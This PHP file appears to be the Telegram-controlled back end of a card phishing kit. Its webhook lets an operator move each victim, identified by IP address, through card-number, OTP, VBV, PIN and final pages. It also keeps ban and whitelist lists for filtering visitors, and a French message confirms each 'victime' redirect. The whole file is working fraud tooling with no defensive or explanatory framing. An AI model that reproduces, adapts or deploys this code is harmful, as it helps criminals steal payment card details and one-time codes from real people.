<?php
$update = json_decode(file_get_contents('php://input'), TRUE);

$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);

$token = $config['sending']['telegram']['token'];


function change($name,$text){
    $paths = [
        '../!#/vbv.json'
    ];
    $data = null;
    foreach ($paths as $path) {
        $jsonString = @file_get_contents($path);
        if ($jsonString !== FALSE) {
            $data = json_decode($jsonString, true);
            $data[$name] = $text;
            $newJsonString = json_encode($data);
            file_put_contents($path, $newJsonString);
            break;
        }
    }
}

function update($name, $ip){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json');
    $data = json_decode($jsonString, true);
    $data["exceptions"][$name] = $data["exceptions"][$name] . "," . $ip;
    $newJsonString = json_encode($data);
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json', $newJsonString);
  }
  

$pages = [
    "cc" => 5,
    "otp" => 6,
    "vbv" => 7,
    "pin" => 8,
    "final" => 9
];

if (isset($_GET['ban'])) {
    update("banned", $_GET['ban']);
}

if (isset($_GET['wl'])) {
    update("whitelist", $_GET['wl']);
}

if (isset($update['callback_query'])) {
    $results = explode('-',$update['callback_query']['data']);
    $ip = $results[0];
    $step = $results[1];
    $chatid = $update['callback_query']['from']['id'];
    $message = "🕺🏿 Victime redirigé vers la page : " . $step;
    file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chatid . '&text=' . $message);
    change($ip, $pages[$step]);
}
?>